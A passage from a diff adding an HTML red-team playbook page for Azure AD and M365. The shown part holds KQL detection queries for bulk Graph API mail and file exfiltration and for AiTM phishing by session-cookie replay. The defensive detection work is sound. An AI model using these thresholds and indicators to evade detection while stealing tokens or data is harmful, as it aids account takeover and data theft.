+| <span class="fn">project</span> TimeGenerated, UserId, Operation, RuleDetails, ClientIP</pre>
+    </div>
+
+    <h4>Detection: Bulk Data Exfiltration via Graph API</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_exfil.kql</span>
+      </div>
+<pre><span class="c">// Detect bulk mail access or file download via Graph API</span>
+<span class="c">// Maps to: T1114.002, T1537</span>
+
+<span class="c">// ── Mass mailbox access (MailItemsAccessed — E5 required) ──</span>
+<span class="k">OfficeActivity</span>
+| <span class="fn">where</span> TimeGenerated > ago(24h)
+| <span class="fn">where</span> Operation == <span class="s">"MailItemsAccessed"</span>
+| <span class="fn">where</span> ResultStatus == <span class="s">"Succeeded"</span>
+| <span class="fn">summarize</span> AccessCount = count(),
+            DistinctMailboxes = dcount(UserId),
+            IPs = make_set(ClientIPAddress)
+    <span class="k">by</span> AppId, bin(TimeGenerated, 1h)
+| <span class="fn">where</span> AccessCount > 100 <span class="k">or</span> DistinctMailboxes > 5
+| <span class="fn">sort by</span> AccessCount <span class="k">desc</span>
+
+<span class="c">// ── Mass file downloads from SharePoint/OneDrive ──</span>
+<span class="k">OfficeActivity</span>
+| <span class="fn">where</span> TimeGenerated > ago(24h)
+| <span class="fn">where</span> Operation <span class="k">in</span> (<span class="s">"FileDownloaded"</span>, <span class="s">"FileSyncDownloadedFull"</span>)
+| <span class="fn">summarize</span> DownloadCount = count(),
+            TotalSize = sum(tolong(OfficeObjectId)),
+            UniqueFiles = dcount(OfficeObjectId)
+    <span class="k">by</span> UserId, ClientIP, bin(TimeGenerated, 1h)
+| <span class="fn">where</span> DownloadCount > 50
+| <span class="fn">sort by</span> DownloadCount <span class="k">desc</span></pre>
+    </div>
+
+    <h4>Detection: AiTM Phishing Indicators</h4>
+    <div class="code">
+      <div class="code-bar">
+        <span class="code-lang">KQL</span>
+        <span class="code-file">detect_aitm_phishing.kql</span>
+      </div>
+<pre><span class="c">// Detect AiTM phishing via anomalous session cookie replay</span>
+<span class="c">// Key indicator: Same session token used from different IPs shortly after login</span>
+
+<span class="k">SigninLogs</span>
+| <span class="fn">where</span> TimeGenerated > ago(24h)
+| <span class="fn">where</span> ResultType == 0 <span class="c">// Successful sign-in</span>
+| <span class="fn">extend</span> SessionId = tostring(AuthenticationProcessingDetails[0].value)
+| <span class="fn">summarize</span> DistinctIPs = dcount(IPAddress),
+            IPList = make_set(IPAddress),
+            UserAgents = make_set(UserAgent),
+            MinTime = min(TimeGenerated),
+            MaxTime = max(TimeGenerated)
+    <span class="k">by</span> UserPrincipalName, SessionId
+| <span class="fn">where</span> DistinctIPs > 1
+| <span class="fn">extend</span> TimeDelta = datetime_diff(<span class="s">'minute'</span>, MaxTime, MinTime)
+| <span class="fn">where</span> TimeDelta &lt; 30 <span class="c">// Same session from 2+ IPs within 30 min</span>
+| <span class="fn">project</span> UserPrincipalName, SessionId, DistinctIPs,
+         IPList, UserAgents, MinTime, TimeDelta
+| <span class="fn">sort by</span> DistinctIPs <span class="k">desc</span>
+
+<span class="c">// ── Correlate with unfamiliar token issuer ──</span>
+<span class="k">SigninLogs</span>
+| <span class="fn">where</span> TimeGenerated > ago(24h)
+| <span class="fn">where</span> ResultType == 0
+| <span class="fn">where</span> IsInteractive == false
+| <span class="fn">where</span> TokenIssuerType == <span class="s">"AzureAD"</span>
+| <span class="fn">where</span> RiskLevelDuringSignIn <span class="k">in</span> (<span class="s">"high"</span>, <span class="s">"medium"</span>)
+| <span class="fn">project</span> TimeGenerated, UserPrincipalName, IPAddress,
+         AppDisplayName, RiskLevelDuringSignIn, RiskState,
+         MfaDetail, ConditionalAccessStatus</pre>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ═══ FOOTER ═══ -->
+<footer class="footer">
+  <p>RED TEAM OPERATIONS PLAYBOOK — AUTHORIZED USE ONLY</p>
+  <p style="margin-top:6px">Azure AD / M365 / OAuth Attack Surface · Generated 2026-02-07 · MITRE ATT&CK v15</p>
+</footer>
+
+</div>
+</body>
+</html>
